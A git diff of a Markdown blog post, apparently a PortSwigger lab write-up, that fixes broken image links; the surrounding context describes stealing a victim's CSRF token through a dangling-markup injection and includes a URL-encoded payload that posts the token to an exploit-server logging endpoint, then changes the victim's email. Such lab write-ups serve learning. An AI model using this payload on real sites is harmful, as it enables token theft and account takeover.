@@ -38,11 +38,11 @@ if(window.name) {
 </script>
 ```
 
-![](/assets/img/uploads/ln1.png]]
+![](/assets/img/uploads/ln1.png)
 
 If it sends successfully the name of the DOM `window` name will be changed to obtain the CSRF token then send it to the victim to change it's email address.  
 
-![](/assets/img/uploads/ln2.png]]
+![](/assets/img/uploads/ln2.png)
 
 Unfortunately, this exploit doesn't work anymore on Google Chrome, By only working in Firefox we can't solve the lab because the victim is only using Chrome client.
 
@@ -69,13 +69,13 @@ After trying many things I came thought a writeup called [Postcards from the pos
 
 After some tries and playing with HTML, I know all the factors and how it is supposed to work and it finally did!
 
-![](/assets/img/uploads/20231125122402.png]]
+![](/assets/img/uploads/20231125122402.png)
 
 ```javascript
 %22%3E%3C/form%3E%3Cform%20class=%22login-form%22%20name=%22evil-form%22%20action=%22https://exploit-0aad00e50419a26982bdf14301f9006c.exploit-server.net/log%22%20method=%22POST%22%3E%3Cbutton%20class=%22button%22%20type=%22submit%22%3E%20Click%20me%20%3C/button%3E
 ```
 
-![](/assets/img/uploads/20231125122458.png]]
+![](/assets/img/uploads/20231125122458.png)
 
 Put it in the exploit server:
 
@@ -87,7 +87,7 @@ location='https://0a3a006c041ba288822ff20900fa00c8.web-security-academy.net/my-a
 
 I delivered the exploit to the victim and got the CSRF token:
 
-![](/assets/img/uploads/20231125113705.png]]
+![](/assets/img/uploads/20231125113705.png)
 
 Then go to the `/my-account/change-email` and make a POC using BurpSuite:
 
@@ -111,8 +111,8 @@ Then go to the `/my-account/change-email` and make a POC using BurpSuite:
 
 Finally, the lab is solved!
 
-![](/assets/img/uploads/solved.png]]
+![](/assets/img/uploads/solved.png)
 
 And officially I solved all the Portswigger labs and ranked 59th on their Hall of fame
 
-![](/assets/img/uploads/20231125124325.png]]
+![](/assets/img/uploads/20231125124325.png)
